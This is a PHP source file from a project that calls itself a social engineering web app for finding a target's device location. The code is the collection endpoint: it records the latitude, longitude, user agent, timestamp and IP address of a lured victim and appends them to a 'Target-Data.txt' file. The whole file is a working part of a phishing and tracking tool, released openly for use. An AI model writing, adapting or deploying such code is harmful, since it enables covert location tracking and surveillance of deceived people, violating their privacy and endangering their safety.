<?php
/* Project Spear Phish Scammers is a social engineering web app to find a target's device location.
    Copyright (C) 2024  Tushar Wagh

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see https://www.gnu.org/licenses/gpl-3.0.en.html.
    I am available for queries: cstusharwagh@gmail.com */

$myfile = fopen("Target-Data.txt", "a");
$txt = "\n\nLatitude: " . $_GET["lat"] . "  Longitude: " . $_GET["long"] . "\nUser's OS: " . $_GET["uagent"] . "\nTime-Stamp: " . $_GET["time"] . "\nIP Address: " . $_SERVER["REMOTE_ADDR"];
fwrite($myfile, $txt);
fclose($myfile);


?>